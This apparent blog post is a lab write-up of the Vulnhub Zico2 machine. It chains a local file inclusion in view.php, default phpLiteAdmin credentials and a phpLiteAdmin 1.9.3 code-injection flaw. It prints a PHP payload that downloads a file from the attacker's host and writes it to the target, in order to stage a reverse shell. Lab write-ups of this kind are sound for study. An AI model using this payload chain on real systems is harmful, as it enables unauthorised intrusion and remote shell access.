---
layout: post
title: Vulnhub Zico 2
---
In this week, I´ve done another vulnhub machine, in this case [Zico2](https://www.vulnhub.com/entry/zico2-1,210/). In my opinion, it was easier than previous machines, both intrusion and privilege escalation steps. As it´s shown below, the host has two main services running, a SSH services and a web application:

![evidence1]({{ site.baseurl }}/images/zico2_01.png)

Analyzing the web application, a LFI vulnerability could be found in "page" get parameter of the "view.php" page:

![evidence2]({{ site.baseurl }}/images/zico2_02.png)

This vulnerability along with default credentials on phpLiteAdmin service (located in the web application in "http://192.168.10.17/dbadmin/") and a [RCE vulnerability in 1.9.3 version of that DBMS](https://www.exploit-db.com/exploits/24044/), could allow us inject and execute PHP code on remote host. First of all, I created a PHP payload with msfvenom that then I uploaded into the victim machine using the RCE vulnerability. Due to a problems with meterpreter payload, I used a more simple PHP shell payload, "php/reverse_php":

![evidence3]({{ site.baseurl }}/images/zico2_03.png)

Inside of the DBMS, you can find other Once it was done, I needed to upload the exploit. To do this, first of all I created a new database, called "hack.php", with only one table and one field. The PHP injection is executed in the default value of that value, that in our case was the next one:

```
<?php function dl($u, $o){$c = file_get_contents($u);file_put_contents($o, $c);}dl("http://192.168.10.12/zico.txt", realpath(realpath(dirname(__FILE__))) . "/zico.php")?>
```
For this phase, I tried to use other techniques to upload the file, for example, using the PHP function ["passthru"](http://www.hackingwithphp.com/4/12/0/executing-external-programs) and operative systems commands such "nc" or "wget" but it didn´t work fine. It was strange because using passthru is possible to execute other commands (such "find", "cat" and so on). Anyway, the exploit was correctly uploaded in "/usr/databases" folder, the next step was configuring the handler of metasploit to serve the reverse connection, and the execution through LFI vulnerability the PHP reverse exploit:


